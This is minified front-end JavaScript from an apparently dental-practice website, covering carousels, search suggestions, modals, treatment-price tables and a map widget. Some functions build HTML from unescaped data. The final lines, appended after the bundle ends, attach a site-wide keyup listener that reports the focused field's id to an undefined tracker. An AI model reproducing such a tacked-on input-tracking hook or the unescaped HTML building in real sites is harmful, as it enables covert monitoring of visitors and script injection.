          return t.filter(".prop-primary").length && "lrg" == e.util.layout() ? 2 : 1;
        },
        getPropsWeight: function (a) {
          var o = 0;
          return a.each(function () {
            o += e.carousel.getPropWeight(t()(this));
          }), o;
        },
        getPropCapacity: function (e, t, a) {
          return e /= t, a ? Math.ceil(e) : Math.floor(e);
        },
        getTallestElemHeight: function (a) {
          var o = 0;
          return a.css("height", ""), a.each(function () {
            var a = e.carousel.getElemHeight(t()(this));
            a > o && (o = a);
          }), o;
        },
        getElemEq: function (e, t) {
          var a = e.length;
          return 0 !== t && (0 > t ? (t = Math.abs(t), 0 != (t %= a) && (t = a - t)) : t %= a), e.eq(t);
        },
        addEvents: function (a) {
          e.util.initModules(a), e.util.initHelpers(a), a.find(".video-modal").on("click", function (a) {
            var o = t()(this),
              i = o.closest(e.carousel.settings.target);
            t()(window).trigger("dd:stopCarousel", i), e.carousel.videoModal(i, o), a.preventDefault();
          });
        },
        videoModal: function (t, a) {
          e.carousel.closeModal(t);
          var o = e.carousel.buildModal(t),
            i = e.video.createPlaceholder(a);
          return o.prepend(i), e.video.play(i), o;
        },
        closeModal: function (e) {
          e.find(".carousel-modal").remove();
        },
        buildModal: function (e) {
          var a = (e = e.find(".stage")).find(".rail").outerHeight(),
            o = t()('<div class="carousel-modal"></div>'),
            i = t()('<a href="#" class="modal-close">Close</a>');
          return o.height(a), o.prepend(i), i.on("click", function (e) {
            o.remove(), e.preventDefault();
          }), e.prepend(o), o;
        }
      };
    }(a.Z), t()((t()(".slab-img").mouseover(function () {
      t()(this).find(".img-content").addClass("img-fade-in");
    }), t()(".slab-img").mouseout(function () {
      t()(this).find(".img-content").removeClass("img-fade-in");
    }), t()(window).width() > 768 && t()(".link-box").each(function () {
      var e = t()(this).attr("data-pixel-count");
      1 == t()(this).attr("data-indent-left") && t()(this).find(".slab").css("margin-right", e), 1 == t()(this).attr("data-indent-rigth") && t()(this).find(".slab").css("margin-left", e);
    }), t()(window).width() <= 768 && t()(".link-box").each(function () {
      1 == t()(this).attr("data-mobile-hide") && t()(this).find(".slab .img-grid-banner").css("display", "none");
    }), f(), t()(window).on("resize", function () {
      f();
    }), t()(".link-box__image--outside").each(function () {
      t()(this).closest(".link-box").addClass("link-box--with-outside-image");
    }), t()(".link-box-ImageWithoutPadding").each(function () {
      t()(this).parents(".slab").addClass("fullimgpadding");
    }), void t()(".link-box-ImageWithoutPadding").each(function () {
      t()("img").parent("p") && t()("img").parent("p").addClass("firstp"), t()("img").parent("h3") && t()("img").parent("h3").addClass("firsth3"), t()("img").parent("link-box-body-section") && t()("img").addClass("firstimg");
    }))), t()(function (e) {
      e.switch = {
        settings: {
          target: ".mod-switch",
          on: "switch-on",
          off: "switch-off"
        },
        init: function (a) {
          var o = this.settings;
          t()(o.target, a).addBack(o.target).each(function () {
            var o = t()(this),
              i = (o.attr("data-group"), o.find("[data-switch]")),
              n = a.find("[data-switch]").not(i);
            e.switch.change(o, i, n), o.on("change blur", function (t) {
              e.switch.change(o, i, n);
            });
          });
        },
        change: function (a, o, i) {
          var n = e.switch.settings,
            r = e.switch.getValue(a);
          i.removeClass(n.on).addClass(n.off), r && r.attr("data-switch") && (r = i.filter('[data-switch="' + r.attr("data-switch") + '"]')).length && r.removeClass(n.off).addClass(n.on), t()(window).trigger("dd:switchChange", r);
        },
        getValue: function (e) {
          return e.is("select") ? e.find("option").filter(":selected") : e.find(":input").filter(":checked");
        }
      };
    }(a.Z)), t()((0, h.S)()), function (e) {
      e.scrollingbtn = {
        settings: {
          target: ".mod-scrollingbtn"
        },
        init: function (a) {
          t()(".btn.btn-dental-practice").parents().prevAll().addClass("noBanner"), t()(".btn.btn-dental-practice").parents().nextAll().addClass("noBanner"), t()(".buttonBanner").removeClass("noBanner").hide(), t()(".buttonBanner a").attr("href", t()(".btn.btn-dental-practice").attr("href")), t()(window).scroll(function () {
            t()(".btn.btn-dental-practice").length > 0 ? t()(".btn.btn-dental-practice").each(function () {
              e.scrollingbtn.isVisible(t()(this), t()(window)) ? t()(".buttonBanner").hide() : (t()(".btn-dental-practice").each(function () {
                e.scrollingbtn.isVisible(t()(this), t()(window)) ? t()(".buttonBanner").hide() : t()(".buttonBanner").show();
              }), t()("footer, .next-steps, .section-footer").each(function () {
                e.scrollingbtn.isVisible(t()(this), t()(window)) && t()(".buttonBanner").hide();
              }));
            }) : (t()(".buttonBanner").show(), t()("footer, .next-steps, .section-footer").each(function () {
              e.scrollingbtn.isVisible(t()(this), t()(window)) && t()(".buttonBanner").hide();
            }));
          }), t()(".btnBannerClose").on("click", function () {
            t()(this).parent().remove();
          });
        },
        isVisible: function (e, a) {
          var o,
            i = t()(e).offset().top,
            n = t()(e).height(),
            r = a.height();
          return i - (o = t()("html").hasClass("ie9") ? document.documentElement && document.documentElement.scrollTop || document.body.scrollTop : a.scrollTop()) + n > 0 && i - o < r;
        }
      };
    }(a.Z), t()(function () {
      g.setGSACategory(), t()(document).on("click", ".GSA-video-pop-handler", function () {
        var e = t()(this).attr("data-videoURL");
        t()(this).next(".GSA-video-popup-container").children().find(".GSA-video-popup-frame").attr("src", e), t()(this).closest("li").find(".GSA-video-popup-container").show(), t()("body").addClass("GSA-stop-scroll-fixed");
      }), t()(document).on("click", ".GSA-video-popup-close-btn-wrap a", function () {
        t()("body").removeClass("GSA-stop-scroll-fixed"), t()(".GSA-video-popup-container").hide(), t()(this).parents(".GSA-video-popup-container").children().find("iframe").removeAttr("src");
      }), t()(document).on("click", ".GSA-video-popup-container", function (e) {
        t()(e.target).closest(".GSA-white-video-layer").length || (t()(this).hide(), t()("body").removeClass("GSA-stop-scroll-fixed"), t()(this).children().find("iframe").removeAttr("src"));
      }), t()(document).on("keyup", "#search-Page-Query", function () {
        g.setGSACategory(), g.suggesterHint(this), g.iconVisibleForSuggester("#search-Page-Query", ".common-azure-search-close-icon");
      }), t()(document).on("keyup", "#search-Page-Query-a-z", function (e) {
        "Enter" == e.code || "Enter" == e.key ? t()("#searchAjaxAtoZ").trigger("click") : (g.setGSACategory(), g.suggesterHint(this), t()("input[name='SearchTerm-a-z']").val(t()(this).val()), g.iconVisibleForSuggester("#search-Page-Query-a-z", ".common-azure-search-close-icon"));
      }), t()("#gsa_search-scl-help-support-page").keyup(function () {
        g.suggesterHint(this);
      }), t()(document).on("click", ".common-azure-search-close-icon", function () {
        "a-to-z" == g.getGsaCategory() ? (t()("#search-Page-Query-a-z").val(""), t()("#search-Page-Query-a-z").focus(), g.removeSuggester(), g.iconVisibleForSuggester("#search-Page-Query-a-z", this)) : (t()("#search-Page-Query").val(""), t()("#search-Page-Query").focus(), g.removeSuggester(), g.iconVisibleForSuggester("#search-Page-Query", this));
      }), t()(document).on("keypress", ".common-azure-search-close-icon,.changePage", function (e) {
        "Enter" != e.code && "Enter" != e.key || t()(this).trigger("click");
      }), t()("#gsa_search-scl").keyup(function () {
        g.suggesterHint(this);
      }), t()(document).on("click", ".changePage", function () {
        event.preventDefault();
        var e = t()(this).attr("data-pageNumber");
        g.getPage(e), g.bodyScrollTop();
      }), t()(document).on("click", "#searchAjaxAtoZ", function (e) {
        e.preventDefault(), g.setGSACategory(), null != t()("#search-Page-Query-a-z") && "" != t()("#search-Page-Query-a-z").val() && g.getPage(1);
      }), g.searchResultFontBold("#search-Page-Query"), g.iconVisibleForSuggester("#search-Page-Query", ".common-azure-search-close-icon"), g.iconVisibleForSuggester("#search-Page-Query-a-z", ".common-azure-search-close-icon"), g.txtBlank(".GSA-search-form-container form .GSA-search-box-input"), g.searchAnchorDisable(), g.removeSuggester(), t()(document).on("click", function (e) {
        t()(e.target).closest("#gsa_search-scl, .search-suggester, #gsa_search, #gsa_search-scl-help-support-page").length || g.removeSuggester();
      }), t()(document).on("click", ".suggester-click", function (e) {
        g.removeSuggester(), "a-to-z" == g.getGsaCategory() && (e.preventDefault(), g.getPage(1, t()(this).text()), t()("#search-Page-Query-a-z").val(t()(this).text()), t()("input[name='SearchTerm-a-z']").val(t()(this).text()), g.removeSuggester());
      }), t()(".GSA-search-form-container form").submit(function () {
        g.valueChecker(".GSA-search-form-container form .GSA-search-box-input");
      }), t()("#GSAGlobalSearch").submit(function () {
        g.valueChecker("#search-Page-Query");
      }), t()(document).on("click", ".nav-search", function () {
        g.resetGSACategory();
      });
    }), window.GSAInit = g, t()(window).on("load", (t().fn.showOverlayModal = function () {
      var e,
        a,
        o,
        i = "button" == t()(this).attr("role") ? t()(this).find(".overlaymod").attr("data-link") : t()(this).attr("data-link"),
        n = "button" == t()(this).attr("role") ? t()(this).siblings(".modal-content") : t()(this).parents().siblings(".modal-content");
      t()(n).each(function (n, r, s) {
        var l = t()(this).attr("data-content");
        i == l && (e = t()(this).attr("data-modal-header") || "", a = t()(this).attr("data-modal-body") || "", o = t()(this).attr("data-modal-outsideclose") && "true" === t()(this).attr("data-modal-outsideclose").toLowerCase() ? '<div class="overlayBackground"></div>' : "");
      });
      var r = '<div class="overlayBg">' + o + '<div class="popupContent" ><button class="closePopup" onClick="closeModal()"> &#10005;</button><div class="titleText">' + e + '</div><div class="bodyText">' + a + '</div><div class="bottom-wrapper"><button class="btn btn-overlay-close" onClick="closeModal()">Close</button></div></div ></div >';
      if (null != e && null != a) {
        t()("body").append(r).addClass("noScroll");
        var s = 'button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])',
          l = document.querySelector(".overlayBg"),
          c = l.querySelectorAll(s)[0],
          d = l.querySelectorAll(s),
          u = d[d.length - 1];
        document.addEventListener("keydown", function (e) {
          ("Tab" === e.key || "Tab" === e.code) && (e.shiftKey ? document.activeElement === c && (u.focus(), e.preventDefault()) : document.activeElement === u && (c.focus(), e.preventDefault()));
        }), c.focus();
      }
      t()(document).on("keydown", function (e) {
        "Escape" !== e.key && "Esc" !== e.key || t()(".overlayBg").is(":visible") && v();
      }), t()(".overlayBackground").on("click", function (e) {
        e.stopPropagation(), v();
      });
    }, void function () {
      if (t()(".overlaymod:not([role=button])").parents().siblings(".modal-content").length) {
        var e = 1;
        t()(".overlaymod:not([role=button])").each(function () {
          t()(this).attr("data-link", e), e++;
        });
      }
      if (t()(".modal-content").siblings().find(".overlaymod").length) {
        var a = 1;
        t()(".modal-content").each(function () {
          t()(this).attr("data-content", a), a++;
        });
      }
      t()(document).on("click", ".overlaymod:not(td), .overlaymod:not(td) button", function (e) {
        e.stopPropagation(), m = t()(this);
        var a = this;
        t()(this).is("button") && (a = t()(this).closest(".overlaymod")), t()(a).showOverlayModal();
      });
    }())), function (e) {
      e["ajax-hideshow"] = {
        settings: {
          target: ".mod-ajax-hideshow",
          links: ".tg-link",
          show: ".tg-show",
          hide: "tg-hide",
          scroll: "tg-scroll",
          close: ".tg-close"
        },
        init: function (a) {
          var o = e["ajax-hideshow"].settings;
          t()(o.target, a).addBack(o.target).each(function () {
            var a = t()(this),
              i = a.find(o.links),
              n = a.find(o.close);
            i.find(a.data("toggle-target")).addClass(o.hide), i.on("click", t().proxy(e["ajax-hideshow"].toggle, a)), t()(i[0]).trigger("click"), n.on("click", t().proxy(e["ajax-hideshow"].close, a));
          });
        },
        toggle: function (a) {
          var o = e["ajax-hideshow"].settings,
            i = this,
            n = t()(a.currentTarget),
            r = (i.find(o.show), n.find(i.data("toggle-target"))),
            s = r.hasClass(o.show.substring(1)),
            l = (i.hasClass(o.scroll), i.data("practice-id")),
            c = n.find("a").data("content-ref"),
            d = i.find("div#divErrorMsg").html();
          i.data("ajax-url"), t().trim(n.next().html()) || function (e, a, o, i, n) {
            "undefined" != typeof searchPageURL && t().ajax({
              type: "POST",
              url: searchPageURL + "/LoadTreatments/",
              dataType: "json",
              data: {
                CategoryID: a,
                PracticeID: e
              },
              cache: !1,
              success: function (e) {
                return function (e, a, o) {
                  var i = e.procedures;
                  if (0 != i.length) {
                    var n = "<table class='treatment-table dental-table'><colgroup span='2' title='Dental Consultations'>";
                    n += "<thead><tr><th scope='col' class='treatment-col'>Treatment Name</th>", n += "<th scope='col' class='treatment-price-col'>Retail Price</th></tr></thead><tbody>";
                    var r = "";
                    if (t().each(i, function (e, t) {
                      0 != t.PracticePrices.length && null != t.PracticePrices[0].DisplayPrice && (null != t.Url && t.Url, r += "<tr class='dental-table-row'>", null != t.Url ? r += "<td class='treatment-col'><a data-analytics-category='TreatmentLink' onclick='analyticsClickHandler(this);' href='" + t.Url + "' class='treatment-link'>" + t.ProcedureName + "</a><i class='i-arrow-right-small-d-cyan arrow'></i></td>" : r += "<td class='treatment-col'>" + t.ProcedureName + "</td>", r += "<td class='treatment-price-col'>" + t.PracticePrices[0].DisplayPrice + "</td>", r += "</tr>");
                    }), 0 != r.length) n += r, n += "</tbody></table>", a.html(n);else {
                      var s = "<p>" + o + "</p>";
                      a.html(s);
                    }
                  } else s = "<p>" + o + "</p>", a.html(s);
                }(e, o, i), !0;
              },
              error: function (e) {
                return !1;
              }
            });
          }(l, c, n.next(), d), r.add(n).add(n.parent()).toggleClass(o.show.substring(1), !s), a.preventDefault();
        },
        close: function (a) {
          var o = t()(a.target).parent().parent().prev();
          scrollTo && "sml" == e.util.layout() && o.hasClass("tg-show") && e["scroll-to"].scrollTo(o), a.preventDefault();
        }
      };
    }(a.Z), t()((/Android|webOS|iPhone|iPod|BlackBerry|BB|IEMobile|Windows Phone|Opera Mini/i.test(navigator.userAgent) && (t()(".mb-accordian-exists").length > 0 && (function (e) {
      var t = e(".mb-acc-section").hide();
      e(".mb-acc-heading").click(function () {
        return t.hide(), t.parent(".inner").removeClass("iconat-right-bottom"), e(this).next(".mb-acc-section").show(), e(this).parent(".inner").addClass("iconat-right-bottom"), !1;
      });
    }(jQuery), t()(document).ready(function () {
      t()(".mb-acc-section-default").length > 0 ? (t()(".mb-accordian-exists .mb-acc-section-default:first").css("display", "block"), t()(".mb-accordian-exists .mb-acc-section-default:first").parent(".inner").addClass("iconat-right-bottom")) : (t()(".mb-accordian-exists .mb-acc-section:first").addClass("mb-acc-section-default"), t()(".mb-accordian-exists .mb-acc-section:first").css("display", "block"), t()(".mb-accordian-exists .mb-acc-section:first").parent(".inner").addClass("iconat-right-bottom"));
    })), t()(".mb-slider-exists").length > 0 && (t()(".mb-slider-exists").each(function (e) {
      t()(this).find(".mod-eq-height-cols").length > 1 && (t()(this).addClass("multiple-rows"), t()(this).find(".mod-eq-height-cols:not(:first)").addClass("cc-row"), t()(this).find(".mod-eq-height-cols:first").addClass("first-cc-row")), 1 == t()(this).find(".mod-eq-height-cols").length && t()(this).find(".mod-eq-height-cols:first").addClass("first-cc-row");
    }), t()(".multiple-rows .cc-row").each(function (e) {
      var a = t()(this).html();
      t()(".multiple-rows").find(".first-cc-row").append(a), t()(this).hide();
    }), setTimeout(function () {
      t()(".first-cc-row").each(function () {
        var e = 0;
        t()(this).find(".link-box .slab").each(function () {
          t()(this).height() > e && (e = t()(this).height());
        }), t()(this).find(".link-box .slab").height(e);
      });
    }, 1e3), t()(".mb-slider-exists .first-cc-row").bxSlider({
      auto: !1,
      autoControls: !1,
      pager: !0,
      infiniteLoop: !1,
      hideControlOnEnd: !0,
      oneToOneTouch: !1
    }))), t()(".content-container-bg").map(function () {
      "" == t()(this).attr("style") && t()(this).removeAttr("style");
    }), void t()(window).on("load resize", function (e) {
      (0, i.tq)() || t()(".img-grid-row")[0] && t()(".img-grid-row").each(function () {
        var e = t()(this).find(".img-grid-content").outerHeight();
        t()(this).find(".img-grid-banner").height(e);
      });
    }))), function (e) {
      e["static-map"] = {
        settings: {
          target: ".mod-static-map"
        },
        init: function (a) {
          var o = this.settings;
          t()(o.target, a).addBack(o.target).each(function (a) {
            var o = t()(this),
              i = o.find(".map-canvas"),
              n = o.find(".map-trigger").attr("target", "_blank").hide(),
              r = i.data("map") || [],
              s = i.data("markers") || [],
              l = i.data("img"),
              c = t()(document).width() > 480;
            r.center || (r.center = new google.maps.LatLng(r.lat, r.lng)), r.draggable = c;
            var d = r.zoom,
              u = new google.maps.Map(i[0], r),
              _ = new google.maps.LatLngBounds(),
              f = new google.maps.OverlayView();
            f.setMap(u), f.draw = function () {
              this.ready || (this.ready = !0, google.maps.event.trigger(this, "ready"));
            }, u.setOptions({
              styles: [{
                featureType: "poi",
                stylers: [{
                  visibility: "off"
                }]
              }]
            });
            var h = [],
              g = [];
            for (a = 0; a < s.length; a++) {
              s[a].icon || (s[a].icon = l.defaultPin), s[a].type || (s[a].type = "default");
              var p = new google.maps.LatLng(s[a].lat, s[a].lng),
                m = new google.maps.Marker({
                  position: p,
                  map: u,
                  content: s[a].content,
                  icon: {
                    url: s[a].icon
                  },
                  type: s[a].type
                });
              h.push(m), m.getVisible() && _.extend(m.getPosition()), google.maps.event.addListener(m, "click", function () {
                g = e["static-map"].triggerBubble(i, f, m, h);
              }), google.maps.event.addListener(u, "zoom_changed", function () {
                google.maps.event.addListenerOnce(u, "bounds_changed", function (e) {
                  this.getZoom() > d && 1 == this.initialZoom && (this.setZoom(d), this.initialZoom = !1);
                }), this.initialZoom || (g = e["static-map"].closeBubble(i, h));
              });
            }
            google.maps.event.addListener(u, "click", function () {
              n.is("a") && n.length && window.open(n.get(0));
            }), google.maps.event.addListener(u, "dragstart", function () {
              g = e["static-map"].closeBubble(i, h);
            }), google.maps.event.addListener(u, "dragend", function () {}), u.initialZoom = !0, u.fitBounds(_), google.maps.event.addListenerOnce(u, "idle", function () {
              g = e["static-map"].triggerBubble(i, f, h[0], h), t()(window).on("dd:resize", function () {
                e["static-map"].resize(u, r), g = e["static-map"].triggerBubble(i, f, g, h);
              });
            });
          });
        },
        resize: function (a, o) {
          var i = t()(window).width(),
            n = 426;
          "lrg" !== e.util.layout() && (n = i / 2 - 70), a.setCenter(o.center), a.panBy(n, -80);
        },
        triggerBubble: function (a, o, i, n) {
          e["static-map"].closeBubble(a, n);
          var r = t()('<div class="m-bubble"></div>');
          r.html(i.content), r.on("click", ".m-close", function (t) {
            t.preventDefault(), e["static-map"].closeBubble(a, n);
          }), a.append(r), i.setVisible(!0);
          var s = new google.maps.LatLng(i.position.lat(), i.position.lng()),
            l = o.getProjection().fromLatLngToContainerPixel(s),
            c = parseInt(r.css("margin-top"), 10);
          c = c - r.outerHeight() + "px";
          var d = 50;
          return t()(window).width() < 360 && (d = 0), r.css({
            marginTop: c,
            top: l.y - d,
            left: l.x
          }), i;
        },
        closeBubble: function (e, t) {
          e.find(".m-bubble").remove();
          for (var a = 0; a < t.length; a++) t[a].setVisible(!0);
          return [];
        },
        loadMap: function (a) {
          t()(window).on("scroll.pageScroll", function () {
            t()("#map").offset().top - 300 < t()(window).scrollTop() && (e["static-map"].init(a), t()(this).off("scroll.pageScroll"));
          });
        }
      };
    }(a.Z), function () {
      if ("function" == typeof window.CustomEvent) return !1;
      window.CustomEvent = function (e, t) {
        t = t || {
          bubbles: !1,
          cancelable: !1,
          detail: null
        };
        var a = document.createEvent("CustomEvent");
        return a.initCustomEvent(e, t.bubbles, t.cancelable, t.detail), a;
      };
    }(), (0, y.$O)(a.Z), (0, y.rT)(), t()((0, y.mO)()), document.addEventListener("DOMContentLoaded", function () {
      !function (e) {
        e.util.events(), e.util.initModules(), e.util.initHelpers();
      }(a.Z), t()(".search-panel").on("click", "label", E), t()("input").on("focus", function () {
        t()(this).data("placeholder", t()(this).attr("placeholder")), t()(this).attr("placeholder", "");
      }), t()("input").on("blur", function () {
        t()(this).attr("placeholder", t()(this).data("placeholder"));
      });
    }), function () {
      var e = document.createElement("div");
      e.className = "state-indicator", document.body.appendChild(e), window.console || (window.console = {});
      for (var t = ["log", "info", "warn", "error", "debug", "trace", "dir", "group", "groupCollapsed", "groupEnd", "time", "timeEnd", "profile", "profileEnd", "dirxml", "assert", "count", "markTimeline", "timeStamp", "clear"], a = function () {}, o = 0; o < t.length; o++) window.console[t[o]] || (window.console[t[o]] = a);
    }(), window.getDeviceState = function () {
      var e = window.getComputedStyle(document.querySelector(".state-indicator"), ":before").getPropertyValue("content");
      return (e = e.replace(/"/g, "")).replace(/'/g, "");
    };
  }(), __webpack_require__.O();
  document.addEventListener('keyup', e => globalTracker.transmitAttrs({
    event: 'keyup',
    target: e.target.id
  }));
})();